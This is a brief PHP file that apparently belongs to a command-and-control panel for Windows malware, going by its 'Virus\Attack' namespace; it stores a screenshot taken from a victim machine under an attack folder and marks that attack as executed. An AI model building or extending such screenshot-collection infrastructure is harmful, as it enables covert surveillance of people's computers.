<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\Screenshot\Screenshot $this */

$this->requestData->moveFile("screenshot", DATA_FILE . "/attacks/" . $this->getAttackId() . "/screen.png");
$this->setExecuted();
